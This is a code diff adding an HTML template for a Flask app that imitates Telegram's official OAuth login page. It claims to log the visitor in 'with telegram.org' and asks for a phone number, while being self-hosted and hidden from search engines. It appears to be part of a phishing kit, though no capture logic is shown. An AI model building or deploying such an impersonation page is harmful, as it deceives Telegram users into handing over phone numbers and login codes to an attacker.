@@ -1,0 +1,27 @@
+<html><head>
+    <meta charset="utf-8">
+    <title>Telegram Authorization</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="MobileOptimized" content="176">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="robots" content="noindex, nofollow">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/bootstrap.min.css') }}">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/bootstrap-extra.css') }}">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/telegram.css') }}">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/oauth.css') }}">
+
+</head>
+<body>
+<main class="login">
+    <section class="login_content" id="login-container">
+        <div class="login_photos"><span class="login_telegram_photo_wrap"><i class="login_telegram_photo"></i></span><a href="https://t.me/TelegramBot" target="_blank"><i class="login_bot_photo bgcolor0" data-content="T"></i></a></div>
+        <div class="login_header_text">Log in to use your Telegram account with <br>telegram.org and <a class="bot_name" href="https://t.me/TelegramBot" target="_blank">TelegramBot</a>.</div>
+        <div class="login_confirm_text">Please enter your <b>phone number</b> in the <a target="_blank" rel="noopener" href="https://telegram.org/faq#login-and-sms">international format</a> and we will send a confirmation message to your account via Telegram.</div>
+        {% block content %}{% endblock %}
+    </section>
+</main>
+</body>
+</html>
